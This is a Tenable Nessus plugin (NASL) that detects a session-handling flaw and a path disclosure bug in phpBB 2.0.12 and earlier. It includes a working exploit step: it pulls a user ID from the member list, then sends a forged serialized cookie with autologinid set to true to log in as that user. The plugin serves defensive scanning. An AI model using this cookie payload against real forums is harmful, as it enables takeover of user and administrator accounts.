#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(17225);
  script_version("$Revision: 1.6 $");

  script_cve_id("CAN-2005-0603", "CAN-2005-0614"); 
  script_bugtraq_id(12678);

  name["english"] = "Multiple vulnerabilities in phpBB <= 2.0.12";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running a version of phpBB that suffers from a
session handling flaw allowing a remote attacker to gain access to any
account, including that of an administrator. 

Also, there is a path disclosure bug in 'viewtopic.php' that can be
exploited by a remote attacker to reveal sensitive information about
the installation that can be used in further attacks. 

See also : http://www.phpbb.com/phpBB/viewtopic.php?f=14&t=267563
Solution : Upgrade to phpBB 2.0.13 or newer.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in phpBB version <= 2.0.12";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("phpbb_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
kb = get_kb_item("www/" + port + "/phpBB");
if (!kb) exit(0);

matches = eregmatch(pattern:"(.*) under (.*)", string:kb);
ver = matches[1];
dir = matches[2];

# To exploit the first vulnerability, we'll get the memberlist which
# gives us a userid to exploit.
req = http_get(item:dir + "/memberlist.php", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if (res == NULL) exit(0);

pat = 'href="profile.php.mode=viewprofile&amp;u=([0-9]+)&amp;sid=';
matches = egrep(pattern:pat, string:res, icase:TRUE);
foreach match (split(matches)) {
  match = eregmatch(pattern:pat, string:match);
  if (!isnull(match)) {
    user = match[1];
    # just grab the first user.
    break;
  }
}

# Use the cookie and userid to try an exploit.
if (!isnull(user)) {
  # nb: autologonid is supposed to be the hex-encoded password of the user
  #     represented as a string; thus, we can exploit the vulnerability 
  #     simply by passing in the boolean (iff the password is set).
  req = string(
    "GET ", dir, "/profile.php?mode=editprofile HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n",
    "Accept: */*\r\n",
    "Cookie: phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bi%3A", user, "%3B%7D\r\n\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);

  # Cookies will be set regardless, but a non-vulnerable 
  # version returns a redirect.
  if (
    egrep(pattern:"Set-Cookie: phpbb2mysql", string:res) && 
    !egrep(pattern:"^Location: http", string:res)
  ) {
    security_hole(port);
  }
}
